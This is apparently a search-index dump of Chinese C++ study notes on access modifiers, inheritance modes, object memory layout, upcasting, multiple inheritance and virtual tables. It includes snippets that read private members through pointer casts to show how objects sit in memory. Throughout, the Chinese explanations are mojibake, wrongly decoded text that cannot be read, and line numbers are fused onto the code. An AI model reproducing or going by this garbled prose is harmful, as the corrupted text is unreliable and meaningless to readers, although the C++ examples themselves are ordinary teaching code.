&quot;Test.h&quot;ï¼Œç„¶åå¼€å§‹å†™äº†å¾ˆå¤šè°ƒç”¨Testç±»ä¸­Maxå’ŒBiggerå‡½æ•°çš„ä»£ç  1234567Demo a;int r = a.Max(1, 2, 3);int r2 = a.Bigger(2, 4);/* ...*/ ä½†å°æ˜ä¸€å¼€å§‹åœ¨è®¾è®¡Testç±»æ—¶å†™çš„Biggerå‡½æ•°åŸæ„ä¹‰æ˜¯ä½œä¸ºMaxå‡½æ•°çš„è¾…åŠ©å‡½æ•°ï¼Œåé¢å°æ˜è§‰å¾—Biggerå‡½æ•°è®¾è®¡å¾—ä¸åˆç†ï¼Œä¿®æ”¹äº†Biggerå‡½æ•°ï¼Œæ¯”å¦‚å‡½æ•°åï¼Œè¿”å›ç±»å‹ï¼Œå‚æ•°ï¼Œå‡½æ•°å†…éƒ¨å®ç°ç­‰ç­‰ã€‚Maxå‡½æ•°é‡Œä»ç„¶é€šè¿‡Biggerå‡½æ•°æ¥å®ŒæˆMaxå‡½æ•°çš„åŠŸèƒ½ã€‚è¿™ä¹ˆä¸€æ”¹ï¼Œå‡ºäº‹äº†ï¼Œå› ä¸ºå°ç‹å·²ç»åœ¨mainå‡½æ•°ä¸­å¤§é‡ç”¨åˆ°äº†Biggerå‡½æ•°ã€‚ ä¸Šè¿°æƒ…å†µçš„é—®é¢˜å‡ºåœ¨å“ªï¼Ÿç­”ï¼šç±»ä¸­çš„å‡½æ•°æ²¡æœ‰åšè®¿é—®æ§åˆ¶ã€‚å¦‚æœæœ‰é‚£ä¹ˆä¸€ç§æœºåˆ¶ï¼Œèƒ½é™åˆ¶Biggerå‡½æ•°åªèƒ½åœ¨ç±»å†…éƒ¨ä½¿ç”¨ï¼Œå°±èƒ½é˜²æ­¢ä¸Šè¿°åœºæ™¯çš„å‘ç”Ÿã€‚ C++æä¾›äº†ç±»ä¸­æˆå‘˜çš„è®¿é—®æ§åˆ¶ï¼Œç”¨è®¿é—®ä¿®é¥°ç¬¦publicã€privateã€protectedã€‚ è®¿é—®ä¿®é¥°ç¬¦ è®¿é—®ä¿®é¥°ç¬¦ åå­— æè¿° public å…¬æœ‰æˆå‘˜ å¯ä»¥è¢«è¯¥ç±»ä¸­çš„å‡½æ•°ã€å­ç±»çš„å‡½æ•°ã€å…¶å‹å…ƒå‡½æ•°è®¿é—®ï¼Œä¹Ÿå¯ä»¥ç”±è¯¥ç±»çš„å¯¹è±¡è®¿é—® protected å—ä¿æŠ¤æˆå‘˜ å¯ä»¥è¢«è¯¥ç±»ä¸­çš„å‡½æ•°ã€å­ç±»çš„å‡½æ•°ã€ä»¥åŠå…¶å‹å…ƒå‡½æ•°è®¿é—®ï¼Œä½†ä¸èƒ½è¢«è¯¥ç±»çš„å¯¹è±¡è®¿é—® private ç§æœ‰æˆå‘˜ åªèƒ½ç”±è¯¥ç±»ä¸­çš„å‡½æ•°ã€å…¶å‹å…ƒå‡½æ•°è®¿é—®ï¼Œä¸èƒ½è¢«ä»»ä½•å…¶ä»–è®¿é—®ï¼Œè¯¥ç±»çš„å¯¹è±¡ä¹Ÿä¸èƒ½è®¿é—® ä½¿ç”¨å»ºè®® æä¾›å¯¹å¤–ä½¿ç”¨çš„å˜é‡æˆ–å‡½æ•°ï¼Œç”¨publicä¿®é¥°ã€‚é‚£ä¹ˆå®ƒä»¬å°±ä¸èƒ½éšæ„æ”¹åŠ¨ï¼Œå› ä¸ºå·²ç»è¢«äººç”¨äº† è‡ªå·±å†…éƒ¨ä½¿ç”¨çš„ï¼Œå°†æ¥å¯èƒ½ä¼šå˜åŠ¨çš„å˜é‡æˆ–å‡½æ•°ï¼Œç”¨privateä¿®é¥° structå’Œclassçš„åŒºåˆ« åªæœ‰ç±»æˆå‘˜çš„é»˜è®¤è®¿é—®æƒä¸åŒè¿™ä¸€ç‚¹åŒºåˆ«ï¼Œå…¶ä»–æ²¡åŒºåˆ«ã€‚ é»˜è®¤è®¿é—®æ§åˆ¶æƒ struct public class private ç»§æ‰¿æ–¹å¼ å‚è€ƒï¼š C++ ç±»è®¿é—®ä¿®é¥°ç¬¦ C++ public protected privateåŒºåˆ« C++ä¸‰ç§ç»§æ‰¿æ–¹å¼ ç»§æ‰¿æ–¹å¼ æè¿° publicç»§æ‰¿ ä¸æ”¹å˜åŸºç±»æˆå‘˜çš„è®¿é—®æƒé™ï¼ŒåŸæœ¬æ˜¯ä»€ä¹ˆå°±æ˜¯ä»€ä¹ˆ privateç»§æ‰¿ ä½¿å¾—åŸºç±»æ‰€æœ‰æˆå‘˜åœ¨å­ç±»ä¸­çš„è®¿é—®æƒé™å˜ä¸ºprivate protectedç»§æ‰¿ å°†åŸºç±»ä¸­publicæˆå‘˜å˜ä¸ºå­ç±»çš„protectedæˆå‘˜ï¼Œå…¶å®ƒæˆå‘˜çš„è®¿é—®æƒé™ä¸å˜ ä¸åŒçš„ç»§æ‰¿æ–¹å¼ä¼šå½±å“åŸºç±»æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­çš„è®¿é—®æƒé™ã€‚ publicç»§æ‰¿æ–¹å¼ åŸºç±»ä¸­æ‰€æœ‰ public æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä¸º public å±æ€§ï¼› åŸºç±»ä¸­æ‰€æœ‰ protected æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä¸º protected å±æ€§ï¼› åŸºç±»ä¸­æ‰€æœ‰ private æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­è¿˜æ˜¯privateæƒé™ï¼Œæ´¾ç”Ÿç±»æ— æƒè®¿é—®ã€‚ protectedç»§æ‰¿æ–¹å¼ åŸºç±»ä¸­çš„æ‰€æœ‰ public æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä¸º protected å±æ€§ï¼› åŸºç±»ä¸­çš„æ‰€æœ‰ protected æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä¸º protected å±æ€§ï¼› åŸºç±»ä¸­æ‰€æœ‰ private æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­è¿˜æ˜¯privateæƒé™ï¼Œæ´¾ç”Ÿç±»æ— æƒè®¿é—®ã€‚ privateç»§æ‰¿æ–¹å¼ åŸºç±»ä¸­çš„æ‰€æœ‰ public æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å‡ä¸º private å±æ€§ï¼› åŸºç±»ä¸­çš„æ‰€æœ‰ protected æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å‡ä¸º private å±æ€§ï¼› åŸºç±»ä¸­æ‰€æœ‰ private æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­è¿˜æ˜¯privateæƒé™ï¼Œæ´¾ç”Ÿç±»æ— æƒè®¿é—®ã€‚ ç»§æ‰¿æ–¹å¼/åŸºç±»æˆå‘˜ publicæˆå‘˜ protectedæˆå‘˜ privateæˆå‘˜ publicç»§æ‰¿ public protected privateï¼Œå­ç±»æ— æƒè®¿é—® protectedç»§æ‰¿ protected protected privateï¼Œå­ç±»æ— æƒè®¿é—® privateç»§æ‰¿ private private privateï¼Œå­ç±»æ— æƒè®¿é—® ä½†æ— è®ºå“ªç§ç»§æ‰¿æ–¹å¼ï¼Œä¸‹é¢ä¸¤ç‚¹éƒ½æ²¡æœ‰æ”¹å˜ï¼š privateå±æ€§çš„æˆå‘˜åªèƒ½è¢«æœ¬ç±»æˆå‘˜ï¼ˆç±»å†…ï¼‰å’Œå‹å…ƒè®¿é—®ï¼Œä¸èƒ½è¢«æ´¾ç”Ÿç±»è®¿é—®ï¼› protectedå±æ€§çš„æˆå‘˜å¯ä»¥è¢«æ´¾ç”Ÿç±»è®¿é—®ã€‚ å…¶ä»–é—®é¢˜ privateæˆå‘˜çœŸçš„ä¸èƒ½è®¿é—®å—ï¼Ÿ èƒ½å¦è®¿é—®æ˜¯é€šè¿‡è¯­æ³•å±‚é¢ï¼Œç¼–è¯‘å™¨å±‚é¢çš„é™åˆ¶ï¼Œç¼–è¯‘å™¨ç¼–è¯‘æ—¶ä¼šæ£€æŸ¥ä»£ç è®¿é—®ç±»æˆå‘˜æ—¶æ˜¯å¦è¿èƒŒäº†è®¿é—®ä¿®é¥°ç¬¦çš„æƒé™æ§åˆ¶ã€‚ä½†å®é™…ä¸Šæƒ³è®¿é—®ï¼Œè¿˜æ˜¯æ‹¦ä¸ä½å­¦åº•å±‚çš„äººçš„ï¼š 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;struct Test&#123;private: int x;public: int y; void Init(int x, int y) &#123; this-&gt;x = x; this-&gt;y = y; &#125;&#125;;int main()&#123; Test t; t.Init(1, 2); int *p = (int *)&amp;t; int n = *p; //ç§æœ‰æˆå‘˜x int m = *(p + 1); //å…¬æœ‰æˆå‘˜y printf(&quot;%d %d &quot;, n, m); return 0;&#125; privateæˆå‘˜æ˜¯å¦è¢«ç»§æ‰¿ çˆ¶ç±»ä¸­çš„ç§æœ‰æˆå‘˜æ˜¯ä¼šè¢«ç»§æ‰¿çš„ï¼Œä½†å­ç±»ä¸­è¿˜æ˜¯æ— æ³•è®¿é—®ï¼Œä¾ç„¶åªæœ‰çˆ¶ç±»çš„æˆå‘˜å‡½æ•°èƒ½è®¿é—®ã€‚è¿™ä¸ªé™åˆ¶ä¹Ÿæ˜¯ç¼–è¯‘å™¨æ–¹é¢çš„é™åˆ¶ï¼Œæƒ³è®¿é—®æ˜¯æ‹¦ä¸ä½çš„ï¼š 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;class Base&#123;public: Base() &#123; x = 11; y = 12; &#125;private: int x; int y;&#125;;class Sub : Base //ç»§æ‰¿Baseç±»æ—¶æ²¡å†™ï¼Œé»˜è®¤æ˜¯privateç»§æ‰¿æ–¹å¼&#123;public: int a; int b;&#125;;int main(int argc, char *argv[])&#123; Sub sub; //å­ç±»å¯¹è±¡åˆ›å»ºæ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•° sub.a = 1; sub.b = 2; int *p = (int *)&amp;sub; printf(&quot;%d &quot;, sizeof(sub)); //16ï¼Œ4ä¸ªint printf(&quot;%d &quot;, *(p + 0)); //åŸºç±»ç§æœ‰æˆå‘˜x printf(&quot;%d &quot;, *(p + 1)); //åŸºç±»ç§æœ‰æˆå‘˜y printf(&quot;%d &quot;, *(p + 2)); //å­ç±»å…¬æœ‰æˆå‘˜a printf(&quot;%d &quot;, *(p + 3)); //å­ç±»å…¬æœ‰æˆå‘˜b return 0;&#125;"},{"title":"ç»§æ‰¿","path":"/wiki/C++/ç»§æ‰¿.html","content":"ç»§æ‰¿ 12345678910111213struct Person &#123; int age; int sex;&#125;; struct Teacher &#123; int age; //å’ŒPersonç»“æ„ä½“ä¸­çš„æˆå‘˜ä¸€æ · int sex; //å’ŒPersonç»“æ„ä½“ä¸­çš„æˆå‘˜ä¸€æ · int level; int classId;&#125;; ä¸Šé¢è¿™æ®µä»£ç ï¼ŒTeacherç±»ä¸­çš„ageå’Œsexå’ŒPersonç±»çš„å˜é‡é‡äº†ï¼Œç›¸å½“äºæˆ‘ä»¬é‡å¤ç¼–å†™äº†ä»£ç ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»§æ‰¿çš„æ–¹å¼æ¥å‡å°‘é‡å¤ä»£ç çš„ç¼–å†™ã€‚ ä»€ä¹ˆæ˜¯ç»§æ‰¿ï¼šç»§æ‰¿å°±æ˜¯æ•°æ®çš„å¤åˆ¶ ä¸ºä»€ä¹ˆè¦ç”¨ç»§æ‰¿ï¼šå‡å°‘é‡å¤ä»£ç çš„ç¼–å†™ Personç§°ä¸ºçˆ¶ç±»æˆ–è€…åŸºç±» Teacherç§°ä¸ºå­ç±»æˆ–è€…æ´¾ç”Ÿç±» 1234567891011struct Person &#123; int age; int sex;&#125;; struct Teacher:Person &#123; int level; int classId;&#125;; æŠŠ4ä¸ªå˜é‡éƒ½å†™åˆ°Teacherç»“æ„ä½“é‡Œï¼Œå’Œï¼Œç»§æ‰¿äº†Personç±»çš„Teacherç±»ï¼Œåæ±‡ç¼–æ˜¯ä¸€æ ·çš„ å†™åˆ°ä¸€èµ·çš„Teacherç»“æ„ä½“ç»§æ‰¿äº†Personç±»çš„Teacherç±»123456789101112131415161718192021222324252627282930struct Person &#123; int age; int sex;&#125;; struct Teacher&#123; int age; int sex; int level; int classId;&#125;;void Test()&#123; Teacher t; t.age = 1; t.sex = 2; t.level = 3; t.classId = 4;&#125;int main() &#123; Test(); return 0;&#125; 12345678910111213141516171819202122232425262728struct Person &#123; int age; int sex;&#125;; struct Teacher:Person &#123; int level; int classId;&#125;;void Test()&#123; Teacher t; t.age = 1; t.sex = 2; t.level = 3; t.classId = 4;&#125;int main() &#123; Test(); return 0;&#125; Upcastingï¼ˆå‘ä¸Šé€ å‹ï¼‰ Upcastingï¼šæŠŠå­ç±»å½“çˆ¶ç±»çœ‹ Upcasting is the act of converting from a Derived reference or pointer to a base class reference or pointer casté€ å‹ï¼Œåªæ˜¯çœ‹å¾…çš„çœ¼å…‰å˜äº†ã€‚è€Œç±»å‹è½¬æ¢ï¼Œä¸§å¤±åŸæ¥çš„æ•°æ®ç±»å‹ å¯ä»¥ç”¨çˆ¶ç±»æŒ‡é’ˆæŒ‡å‘å­ç±»çš„å¯¹è±¡ï¼Œè¿™æ˜¯å…è®¸çš„ï¼Œä¸”å®‰å…¨çš„ ä¾‹ 123456789101112131415161718192021222324252627282930313233343536373839struct Person&#123; int age; int sex;&#125;;struct Teacher : Person&#123; int level; int classId;&#125;;void Test()&#123; Teacher t; t.age = 1; t.sex = 2; t.level = 3; t.classId = 4; Teacher *p1 = &amp;t; p1-&gt;age = 1; p1-&gt;sex = 1; p1-&gt;level = 1; p1-&gt;classId = 1; Person *p2 = &amp;t; //ç¼–è¯‘å™¨æ˜¯å…è®¸å°†å­ç±»å¯¹è±¡èµ‹ç»™çˆ¶ç±»æŒ‡é’ˆçš„ï¼Œä¸ç”¨å¼ºè½¬ä¸º(Person*)ï¼Œ p2-&gt;age = 2; //ok p2-&gt;sex = 2; //ok p2-&gt;level = 2; //æŠ¥é”™ï¼Œæ‰¾ä¸åˆ°level p2-&gt;classId = 2; //æŠ¥é”™ï¼Œæ‰¾ä¸åˆ°classId&#125;int main()&#123; Test(); return 0;&#125; ä¸‹å›¾æ˜¯ä¸€ä¸ªå­ç±»å¯¹è±¡çš„å†…å­˜å¸ƒå±€ç¤ºæ„å›¾ï¼Œåœ¨å­ç±»å¯¹è±¡ä¸­ï¼Œçˆ¶ç±»æˆå‘˜åœ¨å­ç±»æˆå‘˜å‰é¢ï¼ˆä½åœ°å€ï¼‰ï¼Œçˆ¶ç±»æˆå‘˜å’Œå­ç±»æˆå‘˜çš„èµ·å§‹åœ°å€ä¸€æ ·ã€‚&amp;tçš„ç±»å‹ï¼Œå¯ä»¥æ˜¯çˆ¶ç±»ç±»å‹ï¼Œä¹Ÿå¯ä»¥æ˜¯å­ç±»ç±»å‹ã€‚æ‰€ä»¥Person *p2 = &amp;tæ—¶ä¸ç”¨è½¬å‹ã€‚ å¯ä»¥é€šè¿‡p2è®¿é—®ageå’Œsexï¼Œä½†æ— æ³•é€šè¿‡p2è®¿é—®levelå’ŒclassIdã€‚ï¼ˆè¿™æ˜¯ç¼–è¯‘å™¨å±‚é¢æ— æ³•è®¿é—®ï¼Œä½†å¯¹äºå­¦åº•å±‚çš„äººè€Œè¨€ï¼Œæ˜¯æ‹¦ä¸ä½çš„ï¼Œæƒ³è®¿é—®ï¼Œp2+1å°±è¿‡å»äº†ï¼‰ å­ç±»æˆå‘˜å’Œçˆ¶ç±»ç›¸åŒ é‚£ä¹ˆï¼Œå¦‚æœå­ç±»ä¸­çš„ä¸€ä¸ªæˆå‘˜å’Œçˆ¶ç±»ä¸­çš„ä¸€ä¸ªæˆå‘˜ç›¸åŒä¼šå¦‚ä½•ï¼Ÿå¯ä»¥é€šè¿‡sizeofçœ‹è¿™ä¸ªå­ç±»çš„å¤§å°ã€‚ 123456789101112131415161718192021222324#include &lt;stdio.h&gt;struct Person &#123; int age; int sex;&#125;; struct Teacher:Person // Inherit&#123; int age; //å’Œçˆ¶ç±»Personçš„æˆå‘˜ageé‡äº† int classId;&#125;;int main() &#123; Teacher t; t.age = 30; t.sex = 1; t.classId = 20; printf(&quot;%d&quot;, sizeof(t)); //è¾“å‡ºç»“æœæ˜¯16 return 0;&#125; sizeofè¾“å‡ºæ˜¯16ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç®¡å­ç±»ä¸­çš„æˆå‘˜æ˜¯å¦å’Œçˆ¶ç±»æˆå‘˜ç›¸åŒï¼Œåªè¦æ˜¯ç»§æ‰¿ï¼Œç¼–è¯‘å™¨å°±ä¼šå°†çˆ¶ç±»çš„æˆå‘˜æ·»åŠ åˆ°å­ç±»ä¸­ã€‚ å¯ä»¥é€šè¿‡å¯¹è±¡å.çˆ¶ç±»åç§°::æˆå‘˜åç§°æ¥ä½¿ç”¨çˆ¶ç±»çš„ageæˆå‘˜ï¼š 1234567891011int main() &#123; Teacher t; t.Person::age = 30; // Father t.age = 30; t.sex = 1; t.classId = 20; return 0;&#125; å¤šå±‚ç»§æ‰¿ ç»§æ‰¿ä¸ä»…ä»…å±€é™äºçˆ¶ç±»ï¼Œä¼šç»§æ‰¿åœ¨è¯¥ç»§æ‰¿é“¾ä¸Šçš„æ‰€æœ‰çˆ¶ç±» 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;struct A &#123; int a; int b;&#125;; struct B:A &#123; int c; int d;&#125;; struct C:B &#123; int e; int f;&#125;;int main() &#123; C c; printf(&quot;%d&quot;, sizeof(c)); //è¾“å‡ºç»“æœæ˜¯24ï¼Œå³6ä¸ªintç±»å‹ return 0;&#125; Cç»§æ‰¿äº†Bï¼Œè¿˜ç»§æ‰¿äº†A å¤šé‡ç»§æ‰¿ ç±»CåŒæ—¶ç»§æ‰¿ç±»Aå’Œç±»B 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;struct A &#123; int a; int b;&#125;; struct B &#123; int c; int d;&#125;; struct C:A,B // Multiple&#123; int e; int f;&#125;;int main() &#123; C c; printf(&quot;%d&quot;, sizeof(c)); //è¾“å‡ºç»“æœæ˜¯24ï¼Œå³6ä¸ªintç±»å‹ return 0;&#125; è¿™ç§æ–¹å¼åœ¨å¾ˆå¤šé¢å‘å¯¹è±¡è¯­è¨€ä¸­æ˜¯ä¸å…è®¸ä½¿ç”¨çš„ï¼Œåœ¨C++ä¸­æ˜¯å¯ä»¥ä½¿ç”¨çš„ã€‚ä½†ä¸æ¨èä½¿ç”¨å¤šé‡ç»§æ‰¿ï¼Œä¼šå¢åŠ ç¨‹åºçš„å¤æ‚åº¦ï¼Œå®¹æ˜“å‡ºé”™ ç±»Bæˆå‘˜çš„èµ·å§‹åœ°å€æ˜¯å•ç‹¬çš„ï¼Œæ²¡å’Œç±»Aå’Œç±»Céƒ½åœ¨åŒä¸ªèµ·å§‹åœ°å€ï¼Œç¼–è¯‘å™¨åšçš„ç»´æŠ¤å·¥ä½œå°±å¤šäº† æ³¨æ„ï¼šç»§æ‰¿çš„ç±»Aå’Œç»§æ‰¿çš„ç±»Bçš„é¡ºåºï¼Œè°åœ¨å‰ï¼Œè°å°±åœ¨å†…å­˜åˆ†å¸ƒä¸­çš„å‰é¢ Aåœ¨å‰ï¼ŒBåœ¨åBåœ¨å‰ï¼ŒAåœ¨åç»“æ„ä½“å’Œæ•°ç»„ä¸€æ ·ï¼Œéƒ½æ˜¯ä»ä½åœ°å€åˆ°é«˜åœ°å€æ–¹å‘å¢é•¿ã€‚ ä½åœ°å€-&gt;é«˜åœ°å€ï¼šAï¼ŒBï¼ŒC 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;struct A&#123; int a; int b;&#125;;struct B&#123; int c; int d;&#125;;struct C : A, B // Multiple&#123; int e; int f;&#125;;int main()&#123; C c; c.a = 1; c.b = 2; c.c = 3; c.d = 4; c.e = 5; c.f = 6; return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;struct A&#123; int a; int b;&#125;;struct B&#123; int c; int d;&#125;;struct C : B, A // Multiple&#123; int e; int f;&#125;;int main()&#123; C c; c.a = 1; c.b = 2; c.c = 3; c.d = 4; c.e = 5; c.f = 6; return 0;&#125; ä½åœ°å€-&gt;é«˜åœ°å€ï¼šBï¼ŒAï¼ŒC åæ±‡ç¼– å®ƒä»¬çš„åæ±‡ç¼–éƒ½æ˜¯ä¸€æ ·çš„ï¼Œçœ‹ä¸å‡ºåŒºåˆ«ï¼š å†™åˆ°ä¸€èµ·çš„ç»“æ„ä½“ï¼Œå’Œï¼Œç»§æ‰¿äº†ç±»Açš„ç±»B å¤šå±‚ç»§æ‰¿ï¼Œå’Œï¼Œå¤šé‡ç»§æ‰¿"},{"title":"è™šè¡¨ï¼ˆç®€åŒ–ç‰ˆæ–‡ç« ï¼‰","path":"/wiki/C++/è™šè¡¨.html","content":"è¿™æ˜¯çœ‹è§†é¢‘è¯¾åšçš„ç¬”è®°ï¼Œåé¢çœ‹å¤§è¯¾å†™äº†&quot;è™šå‡½æ•°&quot;ï¼Œ&quot;å¤šæ€&quot;ä¸¤ä¸ªæ–‡ç« ï¼Œè¿™ç¯‡å°±ç•™ç€ï¼Œä½œä¸ºç®€åŒ–ç‰ˆï¼Œåˆ äº†å¯æƒœã€‚ æ³¨æ„early binding(æ—©æ†ç»‘/é™æ€æ†ç»‘)å’Œlate bindingé‚£é‡Œä¸ä¸¥è°¨ï¼Œåªæœ‰virtual+çˆ¶ç±»æŒ‡é’ˆ/å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡ï¼Œæ‰æ˜¯late binding æœ¬å°èŠ‚ä»‹ç»C++é€šè¿‡è™šå‡½æ•°æ¥å®ç°å¤šæ€çš„åº•å±‚åŸç†ã€‚ æ¢ç´¢å’Œè§‚å¯Ÿ å‡½æ•°è°ƒç”¨ ä¾‹Aï¼šçˆ¶ç±»ä¸­çš„Printæ˜¯æ™®é€šæˆå‘˜å‡½æ•°ï¼Œå­ç±»overrideäº†çˆ¶ç±»çš„Printå‡½æ•° ä¾‹Bï¼šçˆ¶ç±»ä¸­çš„Printæ˜¯è™šå‡½æ•°ï¼Œå­ç±»overrideäº†çˆ¶ç±»çš„Printå‡½æ•°ã€‚ è§‚å¯Ÿb.PrintBase()ä¸­b.Print()æ±‡ç¼–æŒ‡ä»¤çš„è°ƒç”¨æ–¹å¼ã€‚ ä¾‹Aï¼šearly binding(æ—©æ†ç»‘/é™æ€æ†ç»‘)ä¾‹Bï¼šlate binding(æ™šæ†ç»‘/åŠ¨æ€æ†ç»‘)è§‚å¯Ÿåˆ°æ˜¯ç›´æ¥è°ƒç”¨æ–¹å¼ï¼Œcall å‡½æ•°åœ°å€(00401023)ï¼Œå‡½æ•°åœ°å€æ˜¯æ­»çš„ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; void Print() &#123; printf(&quot;Base::Print() called &quot;); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; void Print() &#123; printf(&quot;Derived::Print() called &quot;); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b; PrintBase(b); printf(&quot; &quot;); Derived d; PrintBase(d); return 0;&#125; æ‰§è¡Œè¾“å‡º1234Base::Print() called Base::Print() called è§‚å¯Ÿåˆ°æ˜¯é—´æ¥è°ƒç”¨æ–¹å¼ï¼Œé€šè¿‡edxé—´æ¥å¯»å€æ¥è°ƒç”¨å‡½æ•°ã€‚ 123450040D408 mov eax,dword ptr [ebp+8]0040D40B mov edx,dword ptr [eax];...;æ£€æŸ¥å †æ ˆå¹³è¡¡ç›¸å…³ï¼Œçœç•¥0040D412 call dword ptr [edx] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; virtual void Print() &#123; printf(&quot;Base::Print() called &quot;); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; void Print() &#123; printf(&quot;Derived::Print() called &quot;); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b; PrintBase(b); printf(&quot; &quot;); Derived d; PrintBase(d); //upcasting return 0;&#125; æ‰§è¡Œè¾“å‡º1234Base::Print() called Derived::Print() called å‘ç°ä¾‹Bè™šå‡½æ•°é‚£ä¸ªï¼Œé€šè¿‡å‡½æ•°å‚æ•°ï¼ˆ[ebp+8]ï¼‰ï¼ŒthisæŒ‡é’ˆæŒ‡å‘çš„ç¬¬ä¸€ä¸ª4å­—èŠ‚ï¼Œæ¥é—´æ¥å¯»å€ã€‚ç–‘é—®ï¼šæŒ‰ä¹‹å‰å­¦çš„ï¼Œå¯¹è±¡ä¸­ç¬¬ä¸€ä¸ªæˆå‘˜åœ¨è¿™é‡Œä¾‹å­ä¸­æ˜¯æ•°æ®æˆå‘˜xå‘€ï¼Œxèƒ½æ¥æ‹¿æ¥é—´æ¥å¯»å€ç”¨ï¼Ÿäºæ˜¯ï¼Œæ¥ç€åˆ†åˆ«æ¢æµ‹ä¸‹ä¾‹Aå’Œä¾‹Bä¸­Baseç±»çš„æ€»å¤§å°æ˜¯å¤šå°‘ ç±»çš„å¤§å° ä¾‹Aï¼šç±»ä¸­æ— è™šå‡½æ•°ä¾‹Bï¼šç±»ä¸­æœ‰è™šå‡½æ•°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; void Print() &#123; printf(&quot;Base::Print() called &quot;); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; void Print() &#123; printf(&quot;Derived::Print() called &quot;); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b; printf(&quot;%d &quot;,sizeof(b)); printf(&quot; &quot;); Derived d; printf(&quot;%d &quot;,sizeof(d)); return 0;&#125; æ‰§è¡Œè¾“å‡º12348121234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; virtual void Print() &#123; printf(&quot;Base::Print() called &quot;); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; void Print() &#123; printf(&quot;Derived::Print() called &quot;); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print();&#125;int main()&#123; Base b; printf(&quot;%d &quot;,sizeof(b)); printf(&quot; &quot;); Derived d; printf(&quot;%d &quot;,sizeof(d)); return 0;&#125; æ‰§è¡Œè¾“å‡º12341216 å¯ä»¥åœ¨Baseç±»å’ŒDerivedç±»ä¸­å¤šåŠ å‡ ä¸ªè™šå‡½æ•°ï¼Œå†æ¬¡è§‚å¯Ÿå¤§å°ï¼Œè¿™é‡Œç•¥ ç±»ä¸­æ— è™šå‡½æ•°æ—¶ï¼Œç±»çš„å¤§å°ä¸ºï¼šæˆå‘˜å˜é‡å¤§å°ä¹‹å’Œ ç±»ä¸­æœ‰è™šå‡½æ•°æ—¶ï¼ˆè‡³å°‘1ä¸ªï¼Œæœ‰1ä¸ªå’Œæœ‰100ä¸ªçš„å¤§å°ä¸€æ ·ï¼‰ï¼Œç±»çš„å¤§å°ä¸ºï¼š4å­—èŠ‚å¤§å°+æˆå‘˜å˜é‡å¤§å°ä¹‹å’Œ å¤šå‡ºæ¥çš„è¿™4å­—èŠ‚å¤§å°åœ¨å“ªï¼Œæ˜¯ä»€ä¹ˆå†…å®¹ï¼Ÿ è™šè¡¨ å½“ä¸€ä¸ªç±»æœ‰è™šå‡½æ•°åï¼Œè¯¥å¯¹è±¡çš„èµ·å§‹åœ°å€ä¸å†æ˜¯æˆå‘˜å˜é‡ï¼Œè€Œæ˜¯ä¸€ä¸ª4å­—èŠ‚å¤§å°çš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€æŒ‡å‘ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„é‡Œå­˜æ”¾çš„æ˜¯ç±»ä¸­æ‰€æœ‰è™šå‡½æ•°çš„å‡½æ•°åœ°å€ï¼ˆæŒ‰è™šå‡½æ•°åœ¨ä»£ç ä¸­å£°æ˜çš„å…ˆåé¡ºåºï¼‰ å¤šæ€çš„æœ¬è´¨ï¼šé—´æ¥è°ƒç”¨+è™šè¡¨ è¿™ä¸ªåœ°å€ç§°ä¸ºè™šå‡½æ•°åœ°å€è¡¨æŒ‡é’ˆï¼Œvpointerï¼Œvptr è¿™ä¸ªæ•°ç»„è¢«ç§°ä¸ºè™šå‡½æ•°åœ°å€è¡¨ï¼ˆç®€ç§°è™šè¡¨ï¼‰ï¼Œvirtualtableï¼Œvtable åœ¨VCä¸­å¯ä»¥åœ¨è°ƒè¯•æ—¶å˜é‡ç›‘è§†çª—å£çœ‹åˆ°vptrçš„å€¼ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;class Base&#123;private: int x; int y;public: Base() &#123;&#125; virtual void Print() &#123; printf(&quot;Base::Print() called &quot;); &#125; virtual void Print2() &#123; printf(&quot;Base::Print2() called &quot;); &#125;&#125;;class Derived : public Base&#123;private: int z;public: Derived() &#123; &#125; void Print() &#123; printf(&quot;Derived::Print() called &quot;); &#125;&#125;;void PrintBase(Base&amp; b)&#123; b.Print(); b.Print2();&#125;int main()&#123; Base b; 